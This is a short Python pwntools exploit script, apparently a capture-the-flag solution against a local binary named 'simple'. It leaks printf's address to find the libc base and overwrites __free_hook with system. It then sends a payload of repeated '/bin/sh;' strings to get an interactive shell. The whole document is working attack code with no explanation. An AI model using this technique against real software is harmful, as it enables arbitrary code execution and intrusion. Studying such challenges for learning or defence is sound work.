from pwn import *

context.arch = 'amd64'
libc = ELF("./libc.so.6")

r = process('./simple')

r.recvuntil('@ ')
libc_base = int(r.recvline().strip(), 16) - libc.symbols['printf']
print("libc_base @ ", hex(libc_base))
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
print("system @ ", hex(system))
r.sendlineafter(':', str(free_hook))
r.sendlineafter(':', p64(system))

payload = '\x00'*0x200 + '/bin/sh;'*0x300
#gdb.attach(r)
r.sendline(payload)


r.interactive()
